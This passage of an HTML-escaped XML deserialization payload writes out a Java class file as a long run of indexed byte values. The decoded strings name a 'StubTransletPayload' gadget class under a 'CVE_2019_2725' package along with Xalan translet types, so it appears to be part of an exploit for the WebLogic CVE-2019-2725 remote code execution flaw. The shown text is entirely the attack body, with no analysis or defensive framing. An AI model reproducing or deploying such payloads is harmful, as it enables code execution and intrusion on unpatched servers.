index="412"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="413"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="414"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="415"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="416"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="417"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="418"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="419"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="420"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="425"&gt;&lt;byte&gt;-1&lt;/byte&gt;&lt;/void&gt;&lt;void index="426"&gt;&lt;byte&gt;-1&lt;/byte&gt;&lt;/void&gt;&lt;void index="427"&gt;&lt;byte&gt;-1&lt;/byte&gt;&lt;/void&gt;&lt;void index="428"&gt;&lt;byte&gt;-1&lt;/byte&gt;&lt;/void&gt;&lt;void index="430"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="431"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="432"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="434"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="435"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="436"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="437"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="438"&gt;&lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="439"&gt;&lt;byte&gt;-3&lt;/byte&gt;&lt;/void&gt;&lt;void index="440"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="441"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="442"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="443"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="444"&gt;&lt;byte&gt;-37&lt;/byte&gt;&lt;/void&gt;&lt;void index="445"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="446"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="449"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="450"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="454"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="455"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="456"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="458"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="459"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="460"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="461"&gt;&lt;byte&gt;-84&lt;/byte&gt;&lt;/void&gt;&lt;void index="462"&gt;&lt;byte&gt;-13&lt;/byte&gt;&lt;/void&gt;&lt;void index="463"&gt;&lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="464"&gt;&lt;byte&gt;-8&lt;/byte&gt;&lt;/void&gt;&lt;void index="465"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="466"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="467"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="468"&gt;&lt;byte&gt;-32&lt;/byte&gt;&lt;/void&gt;&lt;void index="469"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="472"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="473"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="476"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="477"&gt;&lt;byte&gt;-120&lt;/byte&gt;&lt;/void&gt;&lt;void index="478"&gt;&lt;byte&gt;-54&lt;/byte&gt;&lt;/void&gt;&lt;void index="479"&gt;&lt;byte&gt;-2&lt;/byte&gt;&lt;/void&gt;&lt;void index="480"&gt;&lt;byte&gt;-70&lt;/byte&gt;&lt;/void&gt;&lt;void index="481"&gt;&lt;byte&gt;-66&lt;/byte&gt;&lt;/void&gt;&lt;void index="485"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="487"&gt;&lt;byte&gt;-110&lt;/byte&gt;&lt;/void&gt;&lt;void index="488"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="490"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="492"&gt;&lt;byte&gt;34&lt;/byte&gt;&lt;/void&gt;&lt;void index="493"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="495"&gt;&lt;byte&gt;-112&lt;/byte&gt;&lt;/void&gt;&lt;void index="496"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="498"&gt;&lt;byte&gt;37&lt;/byte&gt;&lt;/void&gt;&lt;void index="499"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="501"&gt;&lt;byte&gt;38&lt;/byte&gt;&lt;/void&gt;&lt;void index="502"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="504"&gt;&lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="505"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="506"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="507"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="508"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="509"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="510"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="511"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="512"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="513"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="514"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="515"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="516"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="517"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="518"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="519"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="520"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="521"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="523"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="524"&gt;&lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="525"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="527"&gt;&lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="528"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="529"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="530"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="531"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="532"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="533"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="534"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="535"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="536"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="537"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="538"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="539"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="540"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="541"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="542"&gt;&lt;byte&gt;-83&lt;/byte&gt;&lt;/void&gt;&lt;void index="543"&gt;&lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="544"&gt;&lt;byte&gt;-109&lt;/byte&gt;&lt;/void&gt;&lt;void index="545"&gt;&lt;byte&gt;-13&lt;/byte&gt;&lt;/void&gt;&lt;void index="546"&gt;&lt;byte&gt;-111&lt;/byte&gt;&lt;/void&gt;&lt;void index="547"&gt;&lt;byte&gt;-35&lt;/byte&gt;&lt;/void&gt;&lt;void index="548"&gt;&lt;byte&gt;-17&lt;/byte&gt;&lt;/void&gt;&lt;void index="549"&gt;&lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="550"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="552"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="553"&gt;&lt;byte&gt;60&lt;/byte&gt;&lt;/void&gt;&lt;void index="554"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="555"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="556"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="557"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="558"&gt;&lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="559"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="561"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="562"&gt;&lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="563"&gt;&lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="564"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="565"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="567"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="568"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="569"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="570"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="571"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="572"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="574"&gt;&lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="575"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="576"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="577"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="578"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="579"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="580"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="581"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="582"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="583"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="584"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="585"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="586"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="587"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="588"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="589"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="590"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="592"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="593"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="594"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="595"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="596"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="597"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="598"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="599"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="600"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="601"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="602"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="603"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="604"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="605"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="606"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="607"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="608"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="609"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="610"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="611"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="613"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="614"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="615"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="616"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="617"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="618"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="620"&gt;&lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="621"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="622"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="623"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="624"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="625"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="626"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="627"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="628"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="629"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="630"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="631"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="632"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="633"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="634"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="635"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="636"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="637"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="638"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="639"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="640"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="642"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="643"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="644"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="645"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="646"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="647"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="648"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="649"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="650"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="651"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="652"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="653"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="654"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="655"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="657"&gt;&lt;byte&gt;43&lt;/byte&gt;&lt;/void&gt;&lt;void index="658"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="659"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="660"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="661"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="662"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="663"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="664"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="665"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="666"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="667"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="668"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="669"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="670"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="671"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="672"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="673"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="674"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="675"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="676"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="677"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="678"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="679"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="680"&gt;&lt;byte&gt;36&lt;/byte&gt;&lt;/void&gt;&lt;void index="681"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="682"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="683"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="684"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="685"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="686"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="687"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="688"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="689"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="690"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="691"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="692"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="693"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="694"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="695"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="696"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="697"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="698"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="699"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="700"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="701"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="703"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="704"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="705"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="706"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="707"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="708"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="709"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="710"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="711"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="712"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="713"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="715"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="716"&gt;&lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="717"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="718"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="719"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="720"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="721"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="722"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="723"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="724"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="725"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="726"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="727"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="728"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="729"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="730"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="731"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="732"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="733"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="734"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="735"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="736"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="737"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="738"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="739"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="740"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="741"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="742"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="743"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="744"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="745"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="746"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="747"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="748"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="749"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="750"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="751"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="752"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="753"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="754"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="755"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="756"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="757"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="758"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="759"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="760"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="761"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="762"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="763"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="764"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="765"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="766"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="767"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="768"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="769"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="770"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="771"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="772"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="773"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="774"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="775"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="776"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="777"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="778"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="779"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="780"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="781"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="782"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void 